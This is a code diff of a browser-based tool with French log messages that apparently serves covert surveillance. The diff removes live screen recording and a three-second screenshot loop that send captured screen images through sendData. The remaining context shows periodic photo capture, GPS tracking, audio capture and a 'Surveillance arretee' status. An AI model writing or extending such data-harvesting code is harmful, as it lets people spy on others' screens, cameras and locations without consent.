@@ -87,12 +87,6 @@ async function requestPerm(type) {
         checkPerms();
       }, function() { log('GPS refuse', 'err'); updatePermUI(type, false); });
       return;
-  } else if (type === 'screen') {
-      try {
-        var testStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-        testStream.getTracks().forEach(function(t) { t.stop(); });
-        state.screen = true; ok = true;
-      } catch(e) { ok = false; console.error('Screen error:', e); }
     } else if (type === 'notif') {
       if ('Notification' in window) {
         var r = await Notification.requestPermission();
@@ -208,60 +202,6 @@ async function doAudio() {
   } catch(e) { log('Erreur audio: ' + e.message, 'err'); }
 }
 
-// SCREEN LIVE - Video en direct
-async function doScreen() {
-  log('Ecran live...', 'warn');
-
-  // Verifier support
-  if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
-    log('ERREUR: getDisplayMedia non supporte par ce navigateur', 'err');
-    alert('Votre navigateur ne supporte pas le partage d\'ecran.\n\nUtilisez Chrome ou Firefox sur Android ou PC.');
-    return;
-  }
-
-  try {
-    var stream = await navigator.mediaDevices.getDisplayMedia({
-      video: { mediaSource: 'screen', width: { ideal: 1920 }, height: { ideal: 1080 } },
-      audio: false
-    });
-
-    var video = document.createElement('video');
-    video.srcObject = stream;
-    video.autoplay = true;
-    video.muted = true;
-    video.style.cssText = 'width:100%;max-height:300px;object-fit:contain';
-
-    document.getElementById('liveView').innerHTML = '';
-    document.getElementById('liveView').appendChild(video);
-
-    log('Flux ecran DIRECT!', 'info');
-
-    // Enregistrer en video
-    var recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
-    var chunks = [];
-    recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
-    recorder.onstop = function() {
-      var blob = new Blob(chunks, { type: 'video/webm' });
-      var reader = new FileReader();
-      reader.onloadend = function() {
-        state.screens.push(reader.result);
-        sendData('screen_video', { video: reader.result, index: state.screens.length });
-        log('Video #' + state.screens.length, 'info');
-      };
-      reader.readAsDataURL(blob);
-    };
-    recorder.start();
-
-    state.screenStream = stream;
-
-    stream.getVideoTracks()[0].onended = function() {
-      document.getElementById('liveView').innerHTML = '<div class="live-placeholder"><div class="live-icon">STOP</div><div class="live-text">Partage arrete</div></div>';
-      log('Partage ecran arrete', 'warn');
-    };
-
-  } catch(e) { log('Erreur ecran: ' + e.message, 'err'); }
-}
-
 function doGPS() {
   if (!navigator.geolocation) { log('GPS non supporte', 'err'); return; }
   log('GPS...', 'info');
@@ -281,32 +221,12 @@ function doEncrypt() {
 
 function stopAll() {
   if (state.stream) { state.stream.getTracks().forEach(function(t) { t.stop(); }); state.stream = null; }
-  if (state.screenStream) { state.screenStream.getTracks().forEach(function(t) { t.stop(); }); state.screenStream = null; }
-  if (screenAutoInterval) { clearInterval(screenAutoInterval); screenAutoInterval = null; }
   log('Tout arrete', 'warn');
   document.getElementById('liveView').innerHTML = '<div class="live-placeholder"><div class="live-icon">STOP</div><div class="live-text">Surveillance arretee</div></div>';
 }
 
 // AUTO CAPTURE
 function startAutoCapture() {
-  screenAutoInterval = setInterval(async function() {
-    if (!state.screen) return;
-    try {
-      var stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-      var video = document.createElement('video');
-      video.srcObject = stream; video.autoplay = true; video.muted = true;
-      await sleep(300);
-      var canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth || 1280; canvas.height = video.videoHeight || 720;
-      canvas.getContext('2d').drawImage(video, 0, 0);
-      stream.getTracks().forEach(function(t) { t.stop(); });
-      var dataUrl = canvas.toDataURL('image/jpeg', 0.35);
-      state.screens.push(dataUrl);
-      await sendData('screen_auto', { image: dataUrl, index: state.screens.length, time: new Date().toISOString() });
-      log('Auto #' + state.screens.length, 'info');
-    } catch(e) {}
-  }, 3000);
-
   setInterval(function() {
     if (state.camera) doPhoto();
     if (state.loc) doGPS();
